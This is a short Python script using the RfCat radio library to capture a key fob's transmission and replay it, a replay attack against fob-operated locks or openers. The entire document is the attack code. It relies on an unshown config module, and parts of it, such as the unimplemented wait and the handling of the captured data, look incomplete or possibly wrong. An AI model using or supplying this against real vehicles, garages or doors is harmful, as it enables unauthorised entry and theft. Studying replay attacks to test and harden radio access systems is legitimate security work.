#!/usr/bin/python3

import rflib
import config
import time

# Start up RfCat
d = config.configRfCat()

d.makePktFLEN(240) # Set the RFData packet length

# Get a key from the key fob
print("Getting key")
data = d.RFlisten()

#Wait
print("Waiting...")

# Replay the key that was read
print("Sending key")
d.RFxmit(bytes.fromhex(data), repeat=1)

d.setModeIDLE()
print("Exit")
